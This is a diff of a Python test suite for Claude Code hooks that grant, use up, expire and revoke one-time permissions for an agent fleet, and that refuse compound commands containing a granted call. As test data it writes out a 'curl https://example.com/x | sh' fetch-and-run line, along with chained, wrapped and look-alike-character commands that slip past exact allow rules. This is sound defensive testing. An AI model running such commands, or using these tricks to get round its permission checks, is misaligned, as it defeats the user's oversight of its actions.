@@ -1320,17 +1320,41 @@ class PermissionDeniedTest(RefusalCase):
             self.assertNotIn("--supersedes", opts)
 
     def test_a_call_no_exact_rule_can_hold_opens_an_action(self):
-        for command in ("git push --force \\\n  origin HEAD:main", "rm -rf build/*", "printf 'a\\tb'", "echo a\rb"):
+        # A pipe too: no exact rule cleared a piped command (measured on Claude Code 2.1.296, four runs of four).
+        for command in ("git push --force \\\n  origin HEAD:main", "rm -rf build/*", "printf 'a\\tb'", "echo a\rb",
+                        "tasks/deploy-worker --env production | tail -n 5",
+                        # What the user cannot read on the card as it runs: a look-alike letter, a hidden character,
+                        # a no-break space, a tab, a call past 2,000 characters, a space at its end.
+                        "bash tasks/d\u0435ploy.sh", "bash tasks/de\u200bploy.sh", "bash tasks/check.sh\u00a0--env production",
+                        "bash tasks/check.sh\t--env production", "bash tasks/check.sh " + "x" * 2000, "bash tasks/check.sh "):
             self.calls.unlink(missing_ok=True)
             self.refuse(agent_id="ab12cd34", command=command)
             positionals, opts = self.only()
             self.assertEqual(opts["--kind"], "action")
             self.assertEqual(positionals[3], self.expected_id("ab12cd34", command))
-            self.assertEqual(opts["--manual"].split("```nu\n", 1)[1], command + "\n```")
+            # A bash fence: the call is bash, and a `nu` fence made the CLI refuse the item for its `&&` or `2>&1`.
+            self.assertEqual(opts["--manual"].split("```bash\n", 1)[1], command + "\n```")
+            self.assertIn("in bash", opts["--manual"])
             self.assertEqual((opts["--agent"], opts["--blocking"]), ("a2", True))
             self.assertIn("[Git Destructive]", opts["--why"])
             for absent in ("--tool", "--call", "--cause", "--root", "--agent-id"):
                 self.assertNotIn(absent, opts)
+
+    def test_a_fleet_outside_the_scratchpad_is_found_by_the_registry(self):
+        """A coordinator whose DIR is outside its scratchpad, with no $FLEET_DIR: the registry names its session."""
+        elsewhere = self.tmp / "state" / "infra" / "fleet"
+        elsewhere.mkdir(parents=True)
+        (elsewhere / "state.json").write_text((self.fleet / "state.json").read_text())
+        (self.fleet / "state.json").unlink()
+        self.register(elsewhere, id="infra")
+        self.refuse()
+        positionals, opts = self.only()
+        self.assertEqual(positionals[:3], ["state", str(elsewhere), "decision"])
+        self.assertEqual(opts["--kind"], "permission")
+        self.calls.unlink()
+        self.register(elsewhere, session="another-session", id="infra")
+        self.refuse()
+        self.assertEqual(self.recorded(), [])
 
     def test_another_tools_refusal_opens_an_action_with_its_input(self):
         written = {"file_path": "/x/.claude/settings.local.json", "content": "```\n{}\n```"}
@@ -1374,7 +1398,8 @@ class PermissionDeniedTest(RefusalCase):
         self.assertEqual(dirs, sorted([str(self.fleet), str(other)]))
 
     def test_nothing_outside_a_fleet(self):
-        r = self.hook("PermissionDenied", {**self.base("PermissionDenied"), "tool_name": "Bash",
+        """No fleet in its scratchpad, and the registry records none under its session."""
+        r = self.hook("PermissionDenied", {**self.base("PermissionDenied"), "session_id": "sess-2", "tool_name": "Bash",
                                            "tool_input": {"command": "ls"}, "reason": "x"})
         self.assertSilent(r)
         self.assertEqual(self.recorded(), [])
@@ -1570,8 +1595,8 @@ class TransientRefusalTest(RefusalCase):
         self.assertEqual(len(self.remembered()), 1)
         self.assertEqual(self.recorded(), [])
 
-class GrantRemovalTest(FleetCase):
-    """fleet_grant_sweep: a grant is taken back once its call ran, or once it is older than the TTL."""
+class GrantCase(FleetCase):
+    """A fleet with a session root whose settings hold a granted rule, and its grants.jsonl."""
 
     RULE = "Bash(git push --force origin HEAD:main)"
 
@@ -1607,6 +1632,10 @@ class GrantRemovalTest(FleetCase):
     def allow(self):
         return json.loads(self.settings.read_text())["permissions"]["allow"]
 
+
+class GrantRemovalTest(GrantCase):
+    """fleet_grant_sweep: a grant is taken back once its call ran, or once it is older than the TTL."""
+
     def test_the_granted_call_takes_its_rule_back(self):
         self.grant()
         self.run_tool("git push --force origin HEAD:main")
@@ -1630,7 +1659,7 @@ class GrantRemovalTest(FleetCase):
 
     def test_another_call_leaves_it_until_it_expires(self):
         self.grant()
-        for command, tool in (("git push --force origin HEAD:main 2>&1", "Bash"), ("ls", "Bash"),
+        for command, tool in (("git push --force origin HEAD:mai", "Bash"), ("ls", "Bash"),
                               ("git push --force origin HEAD:main", "Write")):
             self.run_tool(command, tool=tool, now="2026-01-05T09:29:59+00:00")
         self.assertIn(self.RULE, self.allow())
@@ -1644,22 +1673,63 @@ class GrantRemovalTest(FleetCase):
         self.run_tool("ls", now="2026-01-05T09:05:00+00:00", env={"FLEET_GRANT_TTL_MIN": "5"})
         self.assertIn(self.RULE, self.allow())
 
-    def test_a_grant_is_used_only_by_the_caller_it_was_for(self):
-        self.grant(agent_id="ab12cd34")
+    def test_whoever_runs_the_call_uses_the_grant_up(self):
+        """The rule lets any caller of the session through, so one yes is one run, whoever made it."""
+        for granted_to, ran_by in (("ab12cd34", None), ("ab12cd34", "ee55ee55"), (None, "ab12cd34"), ("ab12cd34", "ab12cd34")):
+            with self.subTest(granted_to=granted_to, ran_by=ran_by):
+                self.grants.unlink(missing_ok=True)
+                self.write_settings({"permissions": {"allow": [self.RULE]}})
+                self.grant(agent_id=granted_to)
+                self.run_tool("git push --force origin HEAD:main", agent_id=ran_by)
+                self.assertNotIn(self.RULE, self.allow())
+                self.assertEqual(self.lines()[-1]["why"], "used")
+
+    def test_a_command_that_holds_the_granted_call_uses_it_up(self):
+        """Claude Code lets a compound through when each part has a rule (measured: `A; A` ran A twice on one rule)."""
+        for command in ("git push --force origin HEAD:main; git push --force origin HEAD:main",
+                        "git push --force origin HEAD:main 2>&1", "cd /x && git push --force origin HEAD:main"):
+            with self.subTest(command=command):
+                self.grants.unlink(missing_ok=True)
+                self.write_settings({"permissions": {"allow": [self.RULE]}})
+                self.grant()
+                self.run_tool(command)
+                self.assertNotIn(self.RULE, self.allow())
+                self.assertEqual(self.lines()[-1]["why"], "used")
+
+    def test_each_call_of_a_list_is_its_own_grant(self):
+        """One permission that granted several calls: each rule goes when its call ran, the rest when they expire."""
+        build, deploy = "Bash(tasks/build-worker)", "Bash(tasks/deploy-worker --approve-migrations)"
+        self.write_settings({"permissions": {"allow": [build, deploy]}})
+        self.grant(decision="deploy-0067", rule=build)
+        self.grant(decision="deploy-0067", rule=deploy)
+        self.run_tool("tasks/build-worker")
+        self.assertEqual(self.allow(), [deploy])
+        self.run_tool("tasks/build-worker")
+        self.assertEqual(self.allow(), [deploy])
+        self.run_tool("ls", now="2026-01-05T09:30:00+00:00")
+        self.assertEqual(self.allow(), [])
+        self.assertEqual([(line["rule"], line["why"]) for line in self.lines()[2:]], [(build, "used"), (deploy, "expired")])
+
+    def test_a_granted_call_that_holds_a_shorter_granted_one_uses_up_itself_alone(self):
+        check = "Bash(git push --force origin HEAD:main --dry-run)"
+        self.write_settings({"permissions": {"allow": [self.RULE, check]}})
+        self.grant()
+        self.grant(rule=check)
+        self.run_tool("git push --force origin HEAD:main --dry-run")
+        self.assertEqual(self.allow(), [self.RULE])
         self.run_tool("git push --force origin HEAD:main")
-        self.run_tool("git push --force origin HEAD:main", agent_id="ee55ee55")
-        self.assertIn(self.RULE, self.allow())
-        self.assertEqual(len(self.lines()), 1)
-        self.run_tool("git push --force origin HEAD:main", agent_id="ab12cd34")
+        self.assertEqual(self.allow(), [])
+
+    def test_a_fleet_outside_the_scratchpad_has_its_grants_taken_back(self):
+        elsewhere = self.tmp / "state" / "infra" / "fleet"
+        elsewhere.mkdir(parents=True)
+        (elsewhere / "state.json").write_text((self.fleet / "state.json").read_text())
+        self.register(elsewhere, id="infra")
+        self.grants = elsewhere / "grants.jsonl"
+        self.grant()
+        self.run_tool("git push --force origin HEAD:main")
         self.assertNotIn(self.RULE, self.allow())
         self.assertEqual(self.lines()[-1]["why"], "used")
-
-    def test_a_main_thread_grant_is_not_used_by_a_subagent(self):
-        self.grant()
-        self.run_tool("git push --force origin HEAD:main", agent_id="ab12cd34")
-        self.assertIn(self.RULE, self.allow())
-        self.run_tool("git push --force origin HEAD:main")
-        self.assertNotIn(self.RULE, self.allow())
 
     def test_an_agent_grant_is_taken_back_from_the_grants_file_once_the_spawn_ran(self):
         spawn = {"subagent_type": "Explore", "description": "d", "prompt": "count rows"}
@@ -1710,13 +1780,85 @@ class GrantRemovalTest(FleetCase):
         self.assertNotIn(self.RULE, self.allow())
         self.assertFalse(lock.exists())
 
-    def test_a_removed_grant_is_not_taken_back_twice(self):
+    def test_a_rule_put_back_while_its_grant_is_on_record_is_still_that_grant(self):
+        """A remove line is a record any agent can append, so the rule in the file is what says the grant stands:
+        the same exact rule put back by hand is taken for the grant, and goes again."""
         self.grant()
         self.run_tool("git push --force origin HEAD:main")
-        self.write_settings({"permissions": {"allow": [self.RULE]}})  # granted again by hand, outside the hub
-        self.run_tool("git push --force origin HEAD:main", now="2026-01-05T10:00:00+00:00")
-        self.assertEqual(self.allow(), [self.RULE])
-        self.assertEqual([line["op"] for line in self.lines()], ["grant", "remove"])
+        self.write_settings({"permissions": {"allow": [self.RULE]}})
+        self.run_tool("ls", now="2026-01-05T10:00:00+00:00")
+        self.assertEqual(self.allow(), [])
+        self.assertEqual([(line["op"], line.get("why")) for line in self.lines()],
+                         [("grant", None), ("remove", "used"), ("remove", "expired")])
+
+    def test_a_forged_remove_line_ends_nothing(self):
+        self.grant()
+        with open(self.grants, "a") as f:
+            f.write(json.dumps({"op": "remove", "decision": "p-1a2b3c4d", "rule": self.RULE}) + "\n")
+        self.grant(op="remove")
+        self.run_tool("ls")
+        self.assertIn(self.RULE, self.allow())
+        self.run_tool("git push --force origin HEAD:main")
+        self.assertNotIn(self.RULE, self.allow())
+        self.assertEqual(self.lines()[-1]["why"], "used")
+
+    def test_what_claude_code_takes_for_the_granted_call_uses_it_up(self):
+        """Claude Code 2.1.296 clears these on the rule for the call (measured), so each one is a run of it."""
+        call = "git push --force origin HEAD:main"
+        for command in (f"'git' push --force origin HEAD:main", f'"git" push --force origin HEAD:main', f" {call} ",
+                        f"{call} 2>&1", f"{call} > /dev/null", f"timeout 30 {call}", f"CI=1 nohup {call}", f"{call} # now",
+                        f"command -p {call};"):
+            with self.subTest(command=command):
+                self.grants.unlink(missing_ok=True)
+                self.write_settings({"permissions": {"allow": [self.RULE]}})
+                self.grant()
+                self.run_tool(command)
+                self.assertNotIn(self.RULE, self.allow())
+
+    def test_what_claude_code_does_not_take_for_it_leaves_it(self):
+        """Not cleared by the rule (measured): the grant is not used by a call that never ran on it."""
+        self.grant()
+        for command in ("git  push --force origin HEAD:main", 'git push "--force" origin HEAD:main',
+                        "FOO=1 git push --force origin HEAD:main", "env git push --force origin HEAD:main",
+                        "git push --force origin HEAD:main --tags", 'grep -n "git push --force origin HEAD:main" README.md'):
+            self.run_tool(command)
+        self.assertIn(self.RULE, self.allow())
+
+    def test_a_monitor_that_runs_the_call_uses_it_up(self):
+        """Monitor runs its command under Bash's permission rules."""
+        self.grant()
+        self.run_tool("git push --force origin HEAD:main", tool="Monitor")
+        self.assertNotIn(self.RULE, self.allow())
+
+    def test_a_failed_call_of_a_list_takes_the_rest_of_the_list_back(self):
+        """A list is a sequence: what comes after a failure was allowed for another state of things."""
+        rules = ["Bash(tasks/build)", "Bash(tasks/migrate --env production)", "Bash(tasks/deploy --env production)"]
+        other = "Bash(tasks/check)"
+        self.write_settings({"permissions": {"allow": [*rules, other, "Bash(ls)"]}})
+        for rule in rules:
+            self.grant(decision="deploy-0067", rule=rule)
+        self.grant(decision="p-other", rule=other)
+        self.run_tool("tasks/build")
+        self.assertEqual(self.allow(), [*rules[1:], other, "Bash(ls)"])
+        self.run_tool("tasks/migrate --env production", event="PostToolUseFailure")
+        self.assertEqual(self.allow(), [other, "Bash(ls)"])
+        self.assertEqual([(line["rule"], line["why"]) for line in self.lines()[4:]],
+                         [(rules[0], "used"), (rules[1], "used"), (rules[2], "revoked")])
+
+    def test_with_the_ledger_moved_away_the_grants_still_count(self):
+        self.grant()
+        (self.fleet / "state.json").rename(self.fleet / "state.json.bak")
+        self.run_tool("git push --force origin HEAD:main")
+        self.assertNotIn(self.RULE, self.allow())
+
+    def test_grants_that_cannot_be_read_are_logged_and_left_to_the_hub(self):
+        self.grant()
+        self.grants.chmod(0)
+        self.addCleanup(self.grants.chmod, 0o644)
+        payload = self.payload("PostToolUse", tool_name="Bash", tool_input={"command": "git push --force origin HEAD:main"})
+        self.assertSilent(self.hook("PostToolUse", payload, env={"FLEET_NOW": "2026-01-05T09:05:00+00:00"}))
+        self.assertIn("cannot be read", self.log())
+        self.assertIn(self.RULE, self.allow())
 
     def test_a_second_grant_of_the_same_rule_is_its_own(self):
         self.grant()
@@ -1729,15 +1871,16 @@ class GrantRemovalTest(FleetCase):
                          [("grant", "p-1a2b3c4d"), ("remove", "p-1a2b3c4d"), ("grant", "p-99999999"),
                           ("remove", "p-99999999")])
 
-    def test_a_missing_file_or_rule_still_closes_the_grant(self):
+    def test_a_grant_whose_rule_or_file_is_gone_is_over(self):
+        """The hub's timer, or a person, took the rule out: nothing is left to take back, and nothing is written."""
         self.write_settings({"permissions": {"allow": ["Bash(ls)"]}})
         self.grant()
         other = self.tmp / "gone" / ".claude" / "settings.local.json"
         self.grant(decision="p-00000002", file=other)
-        self.run_tool("git push --force origin HEAD:main")
+        self.run_tool("git push --force origin HEAD:main", now="2026-01-05T11:00:00+00:00")
         self.assertEqual(self.allow(), ["Bash(ls)"])
         self.assertFalse(other.exists())
-        self.assertEqual([line["op"] for line in self.lines()], ["grant", "grant", "remove", "remove"])
+        self.assertEqual([line["op"] for line in self.lines()], ["grant", "grant"])
 
     def test_an_emptied_list_stays_and_so_does_the_file(self):
         self.write_settings({"permissions": {"allow": [self.RULE]}})
@@ -1805,6 +1948,214 @@ class GrantRemovalTest(FleetCase):
         print(f", with live grants not due: median {statistics.median(times):.3f} ms", end="", file=sys.stderr)
         self.assertLess(statistics.median(times), 1, times[:20])
         self.assertIn(self.RULE, self.allow())
+
+
+class GrantAloneTest(GrantCase):
+    """fleet_grant_alone (PreToolUse, Bash and Monitor): a command that runs a granted call inside more is refused
+    while the grant stands; the call itself is taken once, in its turn, within its 30 minutes, with its file as the
+    user allowed it; a command that runs none is left to the permission check."""
+
+    CALL = "git push --force origin HEAD:main"
+    NOW = "2026-01-05T09:05:00+00:00"
+
+    def before(self, command, tool="Bash", now=NOW, **extra):
+        payload = self.payload("PreToolUse", tool_name=tool, tool_input={"command": command}, **extra)
+        r = self.hook("PreToolUse", payload, env={"FLEET_NOW": now, "TZ": "UTC"})
+        self.assertEqual(r.returncode, 0, r.stderr)
+        return json.loads(r.stdout)["hookSpecificOutput"] if r.stdout else None
+
+    def denied(self, command, **extra):
+        out = self.before(command, **extra)
+        self.assertIsNotNone(out, command)
+        self.assertEqual(out["permissionDecision"], "deny", command)
+        return out["permissionDecisionReason"]
+
+    def test_the_granted_call_inside_more_is_refused(self):
+        self.grant()
+        quoted = "'git' push --force origin HEAD:main"
+        for command in (f"{self.CALL}; {self.CALL}", f"{self.CALL} && ls", f"cd /x && {self.CALL}", f"{self.CALL} | tail",
+                        f"{quoted}; {quoted}; {quoted}", f"timeout 30 {self.CALL}; {self.CALL} 2>&1", f"({self.CALL}); ls",
+                        f"echo $({self.CALL})", f'echo "`{self.CALL}`"', f"if true; then {self.CALL}; fi",
+                        f"ls\n{self.CALL}", f"CI=1 {self.CALL} > /dev/null & ls"):
+            with self.subTest(command=command):
+                reason = self.denied(command, agent_id="ab12cd34")
+                self.assertIn(f"`{self.CALL}`", reason)
+                self.assertIn("P1", reason)
+        self.assertIn(self.RULE, self.allow())
+        self.assertFalse((self.fleet / "grants.taken").exists())
+
+    def test_a_monitor_is_held_to_it_too(self):
+        self.grant()
+        self.assertIn("P1", self.denied(f"{self.CALL}; {self.CALL}", tool="Monitor"))
+
+    def test_a_command_that_only_names_the_call_is_left_alone(self):
+        """In a string, a longer word, a comment or a here-document's body, the granted call does not run."""
+        self.grant(rule="Bash(just deploy)")
+        self.write_settings({"permissions": {"allow": ["Bash(just deploy)"]}})
+        for command in ('grep -n "just deploy" README.md', "just deploy-check", "jj describe -m 'docs: how to just deploy'",
+                        "cat justfile", "echo done # ; just deploy", "cat > notes.md <<'EOF'\njust deploy\nEOF",
+                        "just deploy --dry-run", "sudo just deploy"):
+            self.assertIsNone(self.before(command), command)
+
+    def test_the_exact_call_and_other_commands_are_left_alone(self):
+        self.grant()
+        for command in ("ls", "git push origin HEAD:main", self.CALL):
+            self.assertIsNone(self.before(command), command)
+        self.assertIsNone(self.before(f"{self.CALL}; ls", tool="Write"))
+
+    def test_a_granted_call_that_holds_a_shorter_granted_one_is_left_alone(self):
+        self.grant()
+        self.grant(decision="p-2", rule=f"Bash({self.CALL} && ls)")
+        self.write_settings({"permissions": {"allow": [self.RULE, f"Bash({self.CALL} && ls)"]}})
+        self.assertIsNone(self.before(f"{self.CALL} && ls"))
+        self.assertIn("P1", self.denied(f"{self.CALL} && ls; ls"))
+
+    def test_the_second_call_to_take_a_grant_is_refused(self):
+        """Two callers reach PreToolUse before either call has finished: the first takes the grant, by a file made
+        exclusively; the rule stays until a call ran or the 30 minutes are over."""
+        self.grant()
+        self.assertIsNone(self.before(self.CALL, tool_use_id="toolu_1"))
+        self.assertIsNone(self.before(self.CALL, tool_use_id="toolu_1"))
+        reason = self.denied(self.CALL, tool_use_id="toolu_2", agent_id="ab12cd34")
+        self.assertIn("another call already took this grant", reason)
+        self.assertIn("Ask the user again", reason)
+        self.assertIn("another call", self.denied(f"'git' push --force origin HEAD:main"))
+        self.assertIn(self.RULE, self.allow())
+        self.run_tool(self.CALL)
+        self.assertEqual(list((self.fleet / "grants.taken").iterdir()), [])
+        self.assertIsNone(self.before(self.CALL))
+
+    def test_a_call_another_gate_refused_takes_no_grant(self):
+        module = load_hook()
+        self.grant()
+        payload = self.payload("PreToolUse", tool_name="Bash", tool_input={"command": self.CALL})
+        hook = module.Hook("PreToolUse", payload, {**self.env, "FLEET_NOW": self.NOW})
+        hook.denied = True
+        self.assertIsNone(module.fleet_grant_alone(hook))
+        self.assertFalse((self.fleet / "grants.taken").exists())
+        self.assertEqual(module.HANDLERS["PreToolUse"][-1], module.fleet_grant_alone)
+
+    def test_an_expired_grant_refuses_its_own_call_and_goes(self):
+        """The first call after an idle spell is the granted call itself, three hours on."""
+        self.grant()
+        self.assertIsNone(self.before("ls", now="2026-01-05T12:05:00+00:00"))
+        reason = self.denied(self.CALL, now="2026-01-05T12:05:00+00:00")
+        self.assertIn("30 minutes", reason)
+        self.assertIn("Ask the user again", reason)
+        self.assertNotIn(self.RULE, self.allow())
+        self.assertEqual(self.lines()[-1]["why"], "expired")
+        self.assertIsNone(self.before(self.CALL, now="2026-01-05T12:06:00+00:00"))
+
+    def test_a_remove_line_is_believed_only_once_the_rule_is_gone(self):
+        self.grant()
+        self.grant(op="remove")
+        self.assertIn("P1", self.denied(f"{self.CALL}; {self.CALL}; {self.CALL}"))
+        self.write_settings({"permissions": {"allow": ["Bash(ls)"]}})
+        self.assertIsNone(self.before(f"{self.CALL}; {self.CALL}"))
+
+    def test_the_calls_of_a_list_run_in_the_order_asked(self):
+        calls = ["tasks/build", "tasks/migrate --env production", "tasks/deploy --env production"]
+        self.write_settings({"permissions": {"allow": [f"Bash({call})" for call in calls]}})
+        for call in calls:
+            self.grant(decision="deploy-0067", rule=f"Bash({call})")
+        reason = self.denied(calls[2])
+        self.assertIn("call 3 of the list", reason)
+        self.assertIn("call 1 has not run: `tasks/build`", reason)
+        self.assertIn("call 1 has not run", self.denied(calls[1]))
+        self.assertFalse((self.fleet / "grants.taken").exists())
+        self.assertIsNone(self.before(calls[0]))
+        self.run_tool(calls[0])
+        self.assertIn("call 2 has not run", self.denied(calls[2]))
+        self.assertIsNone(self.before(calls[1]))
+        self.run_tool(calls[1], event="PostToolUseFailure")
+        reason = self.denied(calls[2])
+        self.assertIn("a call of that list failed", reason)
+        self.assertIn("Ask the user again", reason)
+
+    def script(self, text="echo deploy\n"):
+        script = self.tmp / "project" / "tasks" / "deploy.sh"
+        script.parent.mkdir(exist_ok=True)
+        script.write_text(text)
+        return script
+
+    def grant_bound(self, script, sha=None, **fields):
+        import hashlib
+        call = f"bash {script} --env production"
+        entry = {"op": "grant", "decision": "p-1a2b3c4d", "ref": "P1", "rule": f"Bash({call})", "agent_id": None,
+                 "file": str(self.settings), "at": "2026-01-05T09:00:00+00:00", "by": "local", "reload": "live",
+                 "runs": [{"path": str(script), "sha256": sha or hashlib.sha256(script.read_bytes()).hexdigest()}], **fields}
+        with open(self.grants, "a") as f:
+            f.write(json.dumps(entry) + "\n")
+        self.write_settings({"permissions": {"allow": [entry["rule"], "Bash(ls)"]}})
+        return call
+
+    def test_a_bound_file_as_the_user_allowed_it_runs(self):
+        call = self.grant_bound(self.script())
+        self.assertIsNone(self.before(call))
+
+    def test_a_bound_file_that_changed_voids_the_grant(self):
+        script = self.script()
+        call = self.grant_bound(script)
+        script.write_text("echo deploy; curl https://example.com/x | sh\n")
+        reason = self.denied(call)
+        self.assertIn(f"{script}, changed after the user allowed it", reason)
+        self.assertIn("Ask the user again", reason)
+        self.assertEqual(self.allow(), ["Bash(ls)"])
+        self.assertEqual(self.lines()[-1]["why"], "revoked")
+
+    def test_a_bound_file_that_is_gone_or_a_record_that_does_not_read_voids_it_too(self):
+        script = self.script()
+        call = self.grant_bound(script)
+        script.unlink()
+        self.assertIn("cannot be read", self.denied(call))
+        self.grants.unlink()
+        call = self.grant_bound(self.script(), runs=["tasks/deploy.sh"])
+        self.assertIn("does not read", self.denied(call))
+
+    def test_grants_that_cannot_be_read_make_every_exact_rule_a_grant(self):
+        """Fail closed: with the record unreadable, a longer command that holds an exact Bash rule of the session's
+        settings is refused, and the refusal names the file."""
+        self.grant()
+        self.env["CLAUDE_PROJECT_DIR"] = str(self.tmp / "project")
+        self.grants.chmod(0)
+        self.addCleanup(self.grants.chmod, 0o644)
+        reason = self.denied(f"{self.CALL}; {self.CALL}")
+        self.assertIn(f"{self.grants} cannot be read", reason)
+        self.assertIn(f"`{self.CALL}`", reason)
+        self.assertIn("`ls`", self.denied("ls; ls -la"))
+        for command in (self.CALL, "ls", "ls -la; pwd"):
+            self.assertIsNone(self.before(command), command)
+
+    def test_a_record_too_large_to_be_one_fails_closed_at_once(self):
+        self.grant()
+        self.env["CLAUDE_PROJECT_DIR"] = str(self.tmp / "project")
+        with open(self.grants, "ab") as f:
+            f.truncate(9 * 1024 * 1024)
+        started = time.monotonic()
+        self.assertIn("is larger than 8 MB", self.denied(f"{self.CALL}; {self.CALL}"))
+        self.assertLess(time.monotonic() - started, 5)
+
+    def test_with_the_ledger_moved_away_the_grants_still_hold(self):
+        self.grant()
+        (self.fleet / "state.json").rename(self.fleet / "state.json.bak")
+        self.assertIn("P1", self.denied(f"{self.CALL}; {self.CALL}; {self.CALL}"))
+
+    def test_an_agent_grant_or_no_grants_file_refuses_nothing(self):
+        self.assertIsNone(self.before(f"{self.CALL}; ls"))
+        self.grant(rule='Agent({"prompt":"x"})', file=self.settings.parent / "tstack-grants.json")
+        self.assertIsNone(self.before('echo Agent({"prompt":"x"}) x'))
+
+    def test_only_the_agent_grant_allows(self):
+        """No Bash path returns allow: the one Allow the hook makes is fleet_agent_grant's."""
+        import inspect
+        module = load_hook()
+        source = inspect.getsource(module)
+        self.assertEqual(len(re.findall(r"\bAllow\(", source)), 2, "the class, and fleet_agent_grant's return")
+        self.assertIn("return Allow(", inspect.getsource(module.fleet_agent_grant))
+        self.grant()
+        for command in (self.CALL, f"{self.CALL}; ls", "ls"):
+            out = self.before(command)
+            self.assertTrue(out is None or out["permissionDecision"] == "deny", out)
 
 
 class AgentGrantTest(HookCase):
@@ -2662,7 +3013,7 @@ class HooksJsonTest(unittest.TestCase):
                     self.assertEqual(h["type"], "command")
                     self.assertEqual(h["command"], f'"${{CLAUDE_PLUGIN_ROOT}}/hooks/tstack-hook" {event}')
                     # the refusal's handler and the push gate start the fleet CLI (Bun): they get the time a start takes
-                    slow = event == "PermissionDenied" or group.get("matcher") == "Bash"
+                    slow = event == "PermissionDenied" or group.get("matcher") == "Bash|Monitor"
                     self.assertLessEqual(h.get("timeout", 60), 30 if slow else 10)
                     # what nobody reads runs in the background: a tool call never waits on a heartbeat
                     self.assertEqual(h.get("async", False), event in (*HEARTBEAT_ONLY, "PermissionDenied"), event)
@@ -2670,7 +3021,7 @@ class HooksJsonTest(unittest.TestCase):
         for event in (*HEARTBEAT_ONLY, "PostToolUse"):
             self.assertNotIn("matcher", config["hooks"][event][0])  # every tool
         # a grant's spawn, and the push gate's Bash calls
-        self.assertEqual([g["matcher"] for g in config["hooks"]["PreToolUse"]], ["Agent", "Bash"])
+        self.assertEqual([g["matcher"] for g in config["hooks"]["PreToolUse"]], ["Agent", "Bash|Monitor"])
         self.assertTrue(os.access(HOOK, os.X_OK))
         self.assertTrue(os.access(MEMO, os.X_OK))
         self.assertEqual((ROOT / "bin" / "memo").resolve(), MEMO.resolve())
